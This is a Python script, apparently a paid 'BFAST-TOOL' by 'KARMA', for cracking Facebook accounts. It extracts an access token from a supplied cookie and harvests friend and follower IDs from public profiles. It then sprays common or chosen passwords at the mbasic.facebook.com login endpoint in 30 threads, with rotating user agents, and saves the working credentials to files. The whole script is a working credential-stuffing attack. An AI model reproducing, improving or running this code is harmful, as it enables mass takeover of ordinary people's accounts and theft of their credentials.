#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import os
try:
    import requests
except ImportError:
    print('\n [×] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module not installed!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module not installed!...\n')
    os.system('pip install bs4')
try:
    import requests
except ImportError:
    print('\n [脳] The requests module is not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [脳] Futures module is not installed yet!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [脳] Bs4 module is not installed yet!...\n')
    os.system('pip install bs4')

try:
    import rich
except ImportError:
    print('\n [脳] Rich module is not installed!...\n')
    os.system('pip install rich')    

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,zlib
from concurrent.futures import ThreadPoolExecutor as karmaa
from datetime import datetime
from bs4 import BeautifulSoup

ct = datetime.now()
n = ct.month
bulan = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = "\033[1;30m" # Hitam

my_color = [Z,M,H]

data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False


# lempankkkkkkkk
def xox(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

ugent= [
               'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]',
               'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ Opera/7.1', 
               'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]', 
               'Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]',
               'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]', 
               'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]', 
               'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]', 
               'Mozilla/5.0 (Windows NT 10.0; OPPSS :)64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
               ]


### Logo
def logo():
        os.system("clear")
        print("""%s
.____/\ .______  .______  ._____.___ .______  
:   /  \:      \ : __   \ :         |:      \ 
|.  ___/|   .   ||  \____||   \  /  ||   .   |
|     \ |   :   ||   :  \ |   |\/   ||   :   |
|      \|___|   ||   |___\|___| |   ||___|   |
|___\  /    |___||___|          |___|    |___|
     \/                                       
                                              
 
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m
	 [➣] OWNER :        KARMA DAVID
	 [➣] GITHUB:        KARMA-KH3N
	
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m
	
\x1b[0;91m         USE FLIGHT MODE FOR 3 SEC
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m                                                                          """%(M))

        print("")
        
        print('             %s√%s√%s√%sBFAST-TOOL%s√%s√%s√'%(M,H,N,M,B,H,M))
        print("")

def linex():
        print("%s════════════════════════════════════════════%s\n"%(Z,N))

#CRACK SELESAI
def result(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print("\n\033[92;1m THE PROCESS HAS BEEN COMPLETED")
        print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(ok)),str(len(cp))))
        os.sys.exit()
    else:
        print('\n\n [%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

#MASUK TOKEN
def karma():
    os.system('clear')
    logo()
    cookie = input("\n %s[%s?%s] ENTER COOKIES : %s"% (M,N,M,N))
    try:
        data = requests.get("https://business.facebook.com/business_locations", headers = {
        "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", 
        "referer"                   : "https://www.facebook.com/",
        "host"                      : "business.facebook.com",
        "origin"                    : "https://business.facebook.com",
        "upgrade-insecure-requests" : "1",
        "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control"             : "max-age=0",
        "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "content-type"              : "text/html; charset=utf-8"
        }, cookies = {
        "cookie"                    : cookie
        })
        find_token = re.search("(EAAG\w+)", data.text)
        hasil = "\n* FAIL : MAYBE YOUR COOKIE INVALID !!" if (find_token is None) else "\n* YOUR FB ACCESS TOKEN : " + find_token.group(1)
        open('.token.txt', 'a').write(find_token.group(1))
        open('.cookes.txt', 'a').write(cookie)
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(find_token.group(1)), cookies = {"cookie":cookie}).json()['name']
        xox("\n%s LOGIN SUCCESSFUL...! "%(N));time.sleep(2)
        didhdhdjs()
    except AttributeError:
        print('\n %s[%s×%s] INVALID COOKIES'%(M,N,M));time.sleep(1);karma()
    except UnboundLocalError:
        print('\n %s[%s×%s] INVALID COOKIES'%(M,N,M));time.sleep(1);karma()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO CONNECTION\n'%(M,N,M))


def didhdhdjs():
    os.system('git pull')
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json()     
    IP = ipm["origin"]
    try:
        tokenz = open('.token.txt', 'r').read()
        cook = open('.cookes.txt', 'r').read()
    except IOError:
        print('\n %s[%s×%s] INVALID TOKEN'%(M,N,M));time.sleep(2);os.system('rm -rf .token.txt');karma()
    try:
        nam = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokenz), cookies = {"cookie":cook}).json()['name'].rsplit(' ')[0].upper()
    except KeyError:
        print('\n %s[%s×%s] INVALID TOKEN'%(M,N,M));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');karma()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO CONNECTION\n'%(N,M,N))
    try:a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"}).json();ip = a["query"];loc = a["country"].upper()
    except KeyError:ip = " "
    print('%s [%s➣%s] %sNAME     %s: %s%s'%(M,N,M,N,M,N,nam))
    print('%s [%s➣%s] %sIP       %s: %s%s'%(N,M,N,M,N,M,ip))
    print('%s [%s➣%s] %sCOUNTRY  %s: %s%s'%(N,M,N,M,N,M,loc))
    print('%s [%s➣%s] %sSTATUS %s  : %sPREMIUM \033[91;1m✓\033[94;1m✓\x1b[0m'%(M,N,M,N,M,N))
    print('')
    print('%s [%s01%s] %sCRACK FROM PUBLIC'%(M,N,M,N));time.sleep(0.03)
    print('%s [%s02%s] %sCRACK FROM PUBLIC %s   [BULK✓✓]'%(M,N,M,N,M));time.sleep(0.03)
    print('%s [%s03%s] %sCRACK FROM FOLLOWERS %s[BULK]'%(M,N,M,N,M));time.sleep(0.03)
    print('%s [%s04%s] %sCRACK FROM FILE'%(M,N,M,N));time.sleep(0.03)
    print('%s [%s00%s] %sLOGOUT %s'%(M,N,M,N,M));time.sleep(0.03)
    pepek = input('\n %s[%sKARMA%s] MENU : '%(M,N,M))
    if pepek == '':
        print("\n %s[%s×%s] DON'T EMPTY... !"%(H,H,H));time.sleep(2);didhdhdjs()
    elif pepek in['1','01']:
            try:
                user = input('%s [➣] INPUT PUBLIC ID : %s'%(N,M))
                r = requests.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name)&access_token={tokenz}", cookies = {"cookie":cook}).json()["friends"]
                for x in r["data"]:
                    id.append(x['id'] + '|' + x['name'])
            except KeyError:
                print('\n %s[%s×%s] FOOL ID NOT PUBLIC'%(M,N,M));time.sleep(3);didhdhdjs()
    elif pepek in['2','02']:
        _ngocok_(tokenz,cook)
    elif pepek in['3','03']:
        _follower_(tokenz,cook)
    elif pepek in['4','04']:
        filelist = input('\033[92;2m  INPUT FILE: ')
        try:
            for line in open(filelist, 'r').readlines():
              id.append(line.strip())
        except:
               print('\n %s[%s×%s] FILE [%s%s%s] NOT FUND FIRST DUMP CHECK 1 TO 4 OPTIONS BRO'%(N,M,N,M,filelist,N));time.sleep(3)
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s➣%s] DELETING TOKEN %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookes.txt')
        exit('\n %s[%s✓%s]%s SUCCESSFULLY DELETED TOKEN'%(N,M,N,H))
    else:
        print('\n %s[%s➣%s] MENU [%s%s%s] NOT FOUND, CHECK THE MENU BRO!'%(N,M,N,M,pepek,N));time.sleep(2);didhdhdjs()
    return __crack__().plerr(id)


def _ngocok_(__ppk__,cok):
    try:
        nanya_keun = int(input('\n %s[%s➣%s] ENTER LIMIT %s:%s '%(N,M,N,M,N)))
    except:nanya_keun=1
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s➣%s] ENTER PUBLIC ID %s%s%s : '%(N,M,N,mnh,M))
        try:
            r = requests.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name)&access_token={__ppk__}", cookies = {"cookie":cok}).json()["friends"]
            for x in r["data"]:
                id.append(x['id'] + '|' + x['name'])
        except (KeyError,IOError):
            print('\n [➣] FOOL ID NOT PUBLIC');time.sleep(3);didhdhdjs()

def _follower_(__ppk__,cok):
    try:
        nanya_keun = int(input('\n %s[%s➣%s] ENTER LIMIT %s:%s '%(M,N,M,N,M)))
    except:nanya_keun=1
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s➣%s] ENTER ID %s%s%s : '%(M,N,M,mnh,N))
        #_memek_ = __convert__(user)
        try:
            r = requests.get(f"https://graph.facebook.com/v1.0/{user}/subscribers?access_token={__ppk__}&limit=5000", cookies = {"cookie":cok}).json()
            for x in r["data"]:
                id.append(x['id'] + '|' + x['name'])
        except (KeyError,IOError):
            print('\n [➣] FOOL ID NOT PUBLIC');time.sleep(3);didhdhdjs()


# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print('\n [%s➣%s] TOTAL ID : %s%s%s' %(M,N,M,len(self.id),N))
        ___mrerror___ = input(' [%s➣%s] USE DEFAULT /MANUAL PASSWORD [d/m]: '%(M,N))
        if ___mrerror___ in ('M', 'm'):
            print('\n %s[%s!%s] USE , (COMMA) FOR SEPARATOR .'%(M,N,M))
            print('\n %s[!] EXAMPLE: %s123456,1234567,223344 ETC.'%(M,N))
            while True:
                nunu = input('\n [%s➣%s] ENTER PASSWORD : '%(N,M))
                print(' [➣] CRACK WITH PASSWORD -> [ %s%s%s ]' % (M, nunu, N))
                if nunu == '':
                    print("\n %s[%s×%s] DON'T EMPTY THE PASSWORD BRO"%(M,N,M))
                elif len(nunu)<=5:
                    print('\n %s[%s×%s] PASSWORD MINIMUM 6 CHARACTERS'%(M,N,M))
                else:
                    def __shristy__(ysc=None): 
                        logo()
                        print("\033[91;1m KARMA IDS : \033[92;3m"+str(len(self.id)))
                        print("\033[91;1m FOOL CLONING HAVE START PLS WAIT..\x1b[0m")
                        print("\033[91;1m WE ARE ANONYMOUS. WE ARE LEGION. WE DO NOT FORGIVE.  WE DO NOT FORGET.\033[91;1m✘\033[93;1m✘\x1b[0m")
                        linex()
                        with karmaa(max_workers=30) as (__karma__):
                            for ikeh in self.id:
                                try:
                                    kimochi = ikeh.split('|')[0]
                                    __karma__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                except: pass

                        result(ok,cp)
                        
                    __shristy__(nunu.split(','))
                    break
                    
        elif ___mrerror___ in ('D', 'd'):
            self.__pler__()
        else:
            print('\n %s[%s×%s] m/d IDIOT!'%(H,H,H));self.plerr(id)

    def __metode__(self, user, __shristy__, xxn):
        global ok,cp,loop
        warna = random.choice(my_color)
        sys.stdout.write(f"\r {warna}[KARMA] {Z}[{H}{loop}{P}-{M}{len(self.id)}{Z}] {Z}[{H}{len(ok)}{P}-{M}{len(cp)}{N}] {Z}[{M}{'{:.1%}'.format(loop/float(len(self.id)))}{Z}]  "),
        sys.stdout.flush()
        try:
            for pw in __shristy__:
                pw = pw.lower()
                session=requests.Session()
                ugent = random.choice(["Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4772.0 Mobile Safari/537.36 EdgA/95.0.1020.48"])
                headers1 = {"Host":xxn,"upgrade-insecure-requests":"1","user-agent":random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"]),"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                p = session.get(f'https://{xxn}/index.php', headers=headers1).text
                dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/home.php"}
                headers2 = {"Host":xxn,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+xxn,"content-type":"application/x-www-form-urlencoded","user-agent":ugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+xxn+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                po = session.post(f"https://{xxn}/login/device-based/validate-password/?shbl=0", data = dataa, headers=headers2, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r {H}[KARMA-OK] {user}|{pw}{N}')
                    wrt = ' [✓] %s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OK/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f'\r {P}[KARMA-CP] {user}|{pw}{N}')
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('CP/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, xxn)

    def __pler__(self):
        logo()
        print("\033[91;1m KARMA IDS : \033[91;1m"+str(len(self.id)))
        print("\033[91;1m FOOL CLONING HAVE START PLS WAIT...\x1b[0m")
        print("\033[91;1m WE ARE ANONYMOUS. WE ARE LEGION. WE DO NOT FORGIVE.  WE DO NOT FORGET.\033[91;1m√\033[93;1m√\x1b[0m")
        linex()
        with karmaa(max_workers=30) as kirim:
            for yntkts in self.id: 
                try:
                    uid, name = yntkts.split('|')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                      pwx = ['1122334455','1234512345','1998998']
                    else:
                      pwx = ['1122334455','1234512345','1998998']
                    kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                except:
                    pass

        result(ok,cp)

def xoshnaw():
  logo() 
  print ('\x1b[1;97m\tYOUR ID IS NOT YET APPROVED\n')
  print('\r        TOOL PRICE 20K | 2 WEEKS\n')
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1m     YOUR ID : "+id)
  try:
    httpCaht = requests.get("https://github.com/Ail13311/moi.py/blob/main/Alli").text
    if id in httpCaht:
      print("\033[1;92m          APPROVAL IS DETECTED...!")
      msg = str(os.geteuid())
      time.sleep(2)
      pass
    else:
        
      print('\r  IF PAYMENT IS SUCCESSFUL SEND YOUR ID...\n')  
      print("\x1b[1;91m  FREE USERS FUK OFF DONT INBOX ME.[KARMA]")
      os.system('am start https://wa.me/+2348110044418?text=Hi+Karma+i+Want+to+pay+for+this+linces:+'+id+'>/dev/null');jeda(1)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()	
if __name__ == '__main__':
        didhdhdjs()
